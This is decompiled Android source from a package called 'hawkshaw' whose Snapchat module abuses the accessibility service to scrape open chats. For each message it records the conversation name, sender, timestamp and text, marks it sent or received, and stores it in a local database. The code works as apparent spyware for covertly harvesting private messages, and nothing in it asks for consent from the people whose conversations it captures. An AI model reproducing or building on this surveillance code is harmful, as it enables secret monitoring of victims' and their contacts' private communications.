package com.hawkshaw.library.features.accessibility.socialmedia;

import M1.d;
import Y1.K;
import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;
import com.hawkshaw.library.datalayer.models.PackageName;
import com.hawkshaw.library.datalayer.room.AppDatabaseKt;
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity;
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt;
import com.hawkshaw.library.ktextensions.NumbersKt;
import java.time.Clock;
import java.util.concurrent.ExecutorService;
import r3.j;

public final class Snapchat {
    public static final Snapchat INSTANCE = new Snapchat();

    /* renamed from: p  reason: collision with root package name */
    private static final String f4967p = "com.snapchat.android:id";

    private Snapchat() {
    }

    /* access modifiers changed from: private */
    public static final void extractMessages$lambda$1(SocialMediaEntity socialMediaEntity) {
        K.n(socialMediaEntity, "$entity");
        AppDatabaseKt.getDb().socialMediaDao().insertSync(socialMediaEntity);
    }

    private final String getEmpty(CharSequence charSequence) {
        return (charSequence == null || j.U(charSequence)) ? "" : charSequence.toString();
    }

    public final void extractMessages(AccessibilityNodeInfo accessibilityNodeInfo, ExecutorService executorService) {
        AccessibilityNodeInfo findFirst;
        CharSequence text;
        String empty;
        AccessibilityNodeInfo child;
        AccessibilityNodeInfo child2;
        AccessibilityNodeInfo child3;
        AccessibilityNodeInfo child4;
        AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo;
        ExecutorService executorService2 = executorService;
        K.n(accessibilityNodeInfo2, "node");
        K.n(executorService2, "executor");
        AccessibilityNodeInfo findFirst2 = AccessibilityUtilsKt.findFirst(accessibilityNodeInfo2, "com.snapchat.android:id/conversation_title_text_view");
        CharSequence text2 = findFirst2 != null ? findFirst2.getText() : null;
        if (text2 != null && (findFirst = AccessibilityUtilsKt.findFirst(accessibilityNodeInfo2, "com.snapchat.android:id/chat_message_list")) != null) {
            int childCount = findFirst.getChildCount();
            for (int i5 = 0; i5 < childCount; i5++) {
                AccessibilityNodeInfo child5 = findFirst.getChild(i5);
                if (child5 != null) {
                    AccessibilityNodeInfo findFirst3 = AccessibilityUtilsKt.findFirst(child5, "com.snapchat.android:id/sender");
                    String empty2 = getEmpty((findFirst3 == null || (child4 = findFirst3.getChild(0)) == null) ? null : child4.getText());
                    AccessibilityNodeInfo findFirst4 = AccessibilityUtilsKt.findFirst(child5, "com.snapchat.android:id/timestamp");
                    String empty3 = getEmpty((findFirst4 == null || (child3 = findFirst4.getChild(0)) == null) ? null : child3.getText());
                    AccessibilityNodeInfo findFirst5 = AccessibilityUtilsKt.findFirst(child5, "com.snapchat.android:id/chat_message_content_container");
                    AccessibilityNodeInfo child6 = (findFirst5 == null || (child = findFirst5.getChild(0)) == null || (child2 = child.getChild(0)) == null) ? null : child2.getChild(0);
                    if (!(child6 == null || (text = child6.getText()) == null || (empty = getEmpty(text)) == null)) {
                        Rect rect = new Rect();
                        child6.getBoundsInScreen(rect);
                        executorService2.execute(new d(new SocialMediaEntity(getEmpty(text2), (String) null, empty2, empty, NumbersKt.getDp(rect.left) < 65 ? SocialMediaEntity.Type.Received : SocialMediaEntity.Type.Sent, Long.valueOf(Clock.systemDefaultZone().millis()), PackageName.SNAPCHAT, empty3), 1));
                    }
                }
            }
        }
    }
}
